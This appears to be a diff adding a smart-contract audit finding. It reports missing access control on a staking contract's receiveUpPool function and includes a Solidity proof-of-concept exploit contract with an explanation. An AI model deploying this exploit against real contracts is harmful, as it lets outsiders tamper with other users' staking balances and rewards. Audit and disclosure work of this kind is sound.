@@ -1,0 +1,46 @@
+Below is one example of an access control issue found during the audit:
+
+1. Vulnerable Function: receiveUpPool (approximately lines 320–335)
+  Reason: This function is declared as public without any access restrictions (such as checking that msg.sender is an allowed “higher pool”). It is meant to be invoked only by a pre‐approved pool during an “up pool” operation. However, because no modifier or check is implemented to restrict the caller, any external account (or malicious contract) could call receiveUpPool with arbitrary parameters. An attacker could thereby “inject” tokens on behalf of some account (or even for themselves) by forcing a safeTransferFrom from their own address into the contract, which could lead to manipulation of reward calculations or staking amounts.
+
+Proof of Concept (PoC):
+
+-----------------------------------------------------------
+pragma solidity ^0.8.19;
+
+interface ILaunchpadLockableStaking {
+    function receiveUpPool(address account, uint256 amount) external;
+    function liquidityMining() external view returns (address stakingToken);
+}
+
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract ExploitReceiverUpPool {
+    ILaunchpadLockableStaking public targetPool;
+    IERC20 public token;
+
+    constructor(address _targetPool, address _token) {
+        targetPool = ILaunchpadLockableStaking(_targetPool);
+        token = IERC20(_token);
+    }
+
+    // This function shows how an attacker could call receiveUpPool
+    // to credit staking rewards to an arbitrary account.
+    function exploit(address victim, uint256 amount) external {
+        // Attacker must approve the target pool contract to transfer tokens from attacker address
+        token.approve(address(targetPool), amount);
+        // Call receiveUpPool with victim as the account to be credited.
+        targetPool.receiveUpPool(victim, amount);
+    }
+}
+-----------------------------------------------------------
+
+Explanation of the PoC:
+• The attacker deploys ExploitReceiverUpPool and calls exploit(...), supplying the address of a “victim” (or even themselves) and an amount of tokens.
+• Because receiveUpPool lacks a check on msg.sender, the call is accepted. The target contract then executes a safeTransferFrom(msg.sender, address(this), amount) – pulling tokens from the attacker.
+• In the process, the victim’s balance (in the target pool’s state) is increased and the attacker’s tokens are “staked” into the victim’s account. This manipulation could lead to unintended reward accruals or disrupt the correct accounting of stakes.
+
+In summary, the missing access control in receiveUpPool allows unauthorized parties to trigger up-pool logic and modify user staking data.
